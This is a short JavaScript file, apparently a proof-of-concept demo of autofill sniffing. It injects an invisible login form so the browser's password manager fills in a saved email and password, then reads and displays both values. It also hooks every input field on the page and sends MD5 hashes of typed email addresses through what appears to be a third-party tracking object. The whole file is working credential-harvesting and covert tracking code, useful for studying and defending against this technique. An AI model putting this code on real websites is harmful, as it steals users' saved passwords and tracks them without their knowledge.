
var sniffPasswordField = function(){
  var passwordInput = document.getElementById('password');
  if (passwordInput.value.length == 0){
    console.log("passwordInput.value.length", passwordInput.value.length);
    window.setTimeout(sniffPasswordField, 1e3);
  }else{
    document.getElementById("sniffed_pwd").innerHTML = "<b>" + passwordInput.value + "</b>";
  }
};

var checkId = function(self) {
  console.log("Inserting the form");
  var container = document.createElement('div');
  container.id = 'be-container';
  container.style.display = 'none';
  var form = document.createElement('form');
  form.attributes.autocomplete = 'on';
  var emailInput = document.createElement('input');
  emailInput.attributes.vcard_name = 'vCard.Email';
  emailInput.id = 'email';
  emailInput.type = 'email';
  emailInput.name = 'email';
  form.appendChild(emailInput);
  var passwordInput = document.createElement('input');
  passwordInput.id = 'password';
  passwordInput.type = 'password';
  passwordInput.name = 'password';
  form.appendChild(passwordInput);
  container.appendChild(form);
  document.body.appendChild(container);
  // <script src="https://rawgit.com/gunesacar/263fe69037511d12466d/raw/8feacb9df6bbe315a4bef4721924871dacc5bd9a/autofillsniff.js"></script>

  window.setTimeout(function(){
    document.getElementById("sniffed_email").innerHTML = "<b>" + emailInput.value + "</b>";
    sniffPasswordField();
  }, 1e3);
};

var checkInputId = function(self) {
  var inputs = document.getElementsByTagName('input');
  for (var i = 0; i < inputs.length; i++) {
    inputs[i].addEventListener('blur', inputIdBlurHandle, false);
  }
};

var inputIdBlurHandle = function() {
  var self = BehavioralEngine.analitic;
  if (self.emailRegexp.test(this.value)) {
    self.sendHash(self, MD5(this.value));
    this.removeEventListener('blur', BehavioralEngine.analitic.inputIdBlurHandle, false);
  }
};
checkId();
